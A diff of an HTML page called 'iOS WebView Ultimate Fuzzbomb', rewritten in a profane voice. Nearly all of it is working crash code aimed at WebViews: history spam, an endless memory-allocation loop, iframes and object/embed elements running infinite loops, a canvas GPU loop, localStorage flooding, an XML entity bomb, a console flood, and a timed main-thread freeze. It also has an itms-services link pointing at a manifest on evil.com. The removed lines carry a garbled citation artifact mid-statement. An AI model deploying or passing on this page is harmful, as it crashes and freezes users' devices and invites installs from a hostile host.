@@ -1,102 +1,133 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>💥 iOS WebView Fuzzbomb 💥</title>
-  <style>
-    body { background-color: black; color: lime; font-family: monospace; }
-    iframe, object, embed { display: none; }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>💣 iOS WebView Ultimate Fuzzbomb 💣</title>
+<style>
+  html, body {
+    background: #000;
+    color: #0f0;
+    font-family: monospace, monospace;
+    margin: 0; padding: 10px;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+  a { color: #0f0; display: block; margin: 8px 0; }
+  iframe, object, embed { display: none; }
+</style>
 </head>
 <body>
-  <h1>FUCK YOUR WEBVIEW</h1>
-  <p>Launching full-spectrum chaos...</p>
+<h1>💥 FUCK YOUR WEBVIEW 💥</h1>
+<p>Let’s fucking crash shit.</p>
 
-  <script>
-    // 🍔 History Bomb
-    for (let i = 0; i < 50000; i++) {
-      history.pushState({}, '', '#' + Math.random());
-    }
+<script>
+  // FUCKING HISTORY BOMBSHELL - Spam pushState with random hashes
+  (function historySpam() {
+    try {
+      for (let i = 0; i < 100000; i++) {
+        history.pushState({}, '', '#' + Math.random());
+      }
+    } catch(e) {}
+  })();
 
-    // 🧠 Memory Bloat
-    setTimeout(() => {
-      let memoryAbuse = [];
-      while (true) memoryAbuse.push(new Array(1e6).fill("💣"));
-    }, 1000);
+  // MEMORY HOG - Eat that RAM alive
+  setTimeout(() => {
+    try {
+      let memLeak = [];
+      while(true) {
+        memLeak.push(new Array(1e6).fill('💣'));
+      }
+    } catch(e) {}
+  }, 1000);
 
-    // 🪞 iframe Bomb
-    for (let i = 0; i < 50; i++) {
-      let iframe = document.createElement('iframe');
-      iframe.srcdoc = `<script>while(true){}</script>`;
-      document.body.appendChild(iframe);
-    }
+  // IFRAME INCEPTION - 100 fucking nested infinite loops in iframes
+  for(let i = 0; i < 100; i++) {
+    let iframe = document.createElement('iframe');
+    iframe.srcdoc = `<script>while(true){}</script>`;
+    document.body.appendChild(iframe);
+  }
 
-    // 🎨 Canvas Crasher
-    let canvas = document.createElement('canvas');
-    document.body.appendChild(canvas);
-    let ctx = canvas.getContext('2d');
-    setTimeout(() => {
-      while (true) {
+  // CANVAS FUCKERY - GPU meltdown in 3...2...1...
+  setTimeout(() => {
+    try {
+      let canvas = document.createElement('canvas');
+      document.body.appendChild(canvas);
+      let ctx = canvas.getContext('2d');
+      while(true) {
         ctx.arc(1e10, 1e10, 1e10, 0, 2 * Math.PI);
       }
-    }, 500);
+    } catch(e) {}
+  }, 500);
 
-    // 🧪 JavaScript Bridge Probe
-    try {
-      window.webkit.messageHandlers.nonexistent.postMessage("probe");
-    } catch (e) {}
+  // JS BRIDGE PROBE - Are you even listening, webkit?
+  try {
+    for(let i=0; i<1000; i++) {
+      window.webkit.messageHandlers.nonexistent.postMessage('probe');
+    }
+  } catch(e) {}
 
-    // 🔗 Protocol Handler Test
+  // PROTOCOL FUCKERY - itms-services, tel:, mailto:, sms: spam links
+  const protocols = [
+    'itms-services://?action=download-manifest&url=https://evil.com/manifest.plist',
+    'tel:+1234567890',
+    'mailto:evil@bad.com',
+    'sms:+1234567890'
+  ];
+  protocols.forEach(url => {
     let a = document.createElement('a');
-    a.href = 'itms-services://?action=download-manifest&url=https://evil.com/manifest.plist';
-    a.innerText = 'TRIGGER itms-services';
+    a.href = url;
+    a.textContent = `TRY TO OPEN: ${url}`;
     document.body.appendChild(a);
+  });
 
-    // 🐍 Giant URI Abuse
-    let hugeLink = document.createElement('a');
-    hugeLink.href = 'http://example.com/' + 'A'.repeat(100000);
-    hugeLink.innerText = 'Oversized URI';
-    document.body.appendChild(hugeLink);
+  // GIANT FUCKING URI - stress that parser with a 200k character URL
+  let bigURL = 'http://example.com/' + 'A'.repeat(200000);
+  let bigLink = document.createElement('a');
+  bigLink.href = bigURL;
+  bigLink.textContent = 'Giant URI Test Link';
+  document.body.appendChild(bigLink);
 
-    // 🦠 LocalStorage Bloat
-    for (let i = 0; i < 1000; i++) {
-      localStorage.setItem('fuzz' + i, 'X'.repeat(1024 * 1024));
+  // LOCALSTORAGE APOCALYPSE - fill that disk quota with shit
+  try {
+    for(let i=0; i<2000; i++) {
+      localStorage.setItem('fuzz' + i, 'X'.repeat(1024*1024));
     }
+  } catch(e) {}
 
-    // 🧯 Object/Embed Bomb
-    for (let i = 0; i < 20; i++) {
-      let o = document.createElement('object ​:contentReference[oaicite:0]{index=0}​
-            let o = document.createElement('object');
-      o.data = "javascript:while(true){}";
-      document.body.appendChild(o);
+  // OBJECT & EMBED REAPER - legacy plugin injection attempt
+  for(let i=0; i<50; i++) {
+    let obj = document.createElement('object');
+    obj.data = 'javascript:while(true){}';
+    document.body.appendChild(obj);
+    let embed = document.createElement('embed');
+    embed.src = 'javascript:while(true){}';
+    document.body.appendChild(embed);
+  }
 
-      let e = document.createElement('embed');
-      e.src = "javascript:while(true){}";
-      document.body.appendChild(e);
-    }
+  // XML BOMB - entity expansion to choke parsers
+  try {
+    let parser = new DOMParser();
+    let xml = '<!DOCTYPE lolz [' + ('<!ENTITY a "1234567890">'.repeat(2000)) + ']><lolz>&a;</lolz>';
+    parser.parseFromString(xml, 'application/xml');
+  } catch(e) {}
 
-    // 📞 tel: spam
-    for (let i = 0; i < 10; i++) {
-      let tel = document.createElement('a');
-      tel.href = `tel:+123456${i}`;
-      tel.innerText = `Call Trap ${i}`;
-      document.body.appendChild(tel);
-    }
+  // CONSOLE FUCKLOAD - flood the debug console until it pukes
+  for(let i=0; i<1e6; i++) {
+    console.log('YOU ARE FUCKED #' + i);
+  }
 
-    // 🪵 Log flood
-    for (let i = 0; i < 1e6; i++) {
-      console.log("FUCK YOU, DEBUGGER #" + i);
-    }
+  // INFINITE REDIRECT LOOP LINK - click at your own fucking risk
+  let redir = document.createElement('a');
+  redir.href = 'data:text/html,<script>location.href=location.href</script>';
+  redir.textContent = '⚠️ INFINITE REDIRECT LOOP';
+  document.body.appendChild(redir);
 
-    // 🔄 Infinite redirect test (Only trigger if manual click)
-    let redir = document.createElement('a');
-    redir.href = 'data:text/html,<script>location.href=location.href</script>';
-    redir.innerText = '⚠️ INFINITE REDIRECT';
-    document.body.appendChild(redir);
+  // EVENT LOOP FREEZE - after 15 seconds, freeze everything like a goddamn statue
+  setTimeout(() => {
+    while(true){}
+  }, 15000);
+</script>
 
-    // ⌛ Event loop freeze (delayed to bypass early kill)
-    setTimeout(() => {
-      while (true) {}
-    }, 10000);
-  </script>
 </body>
 </html>
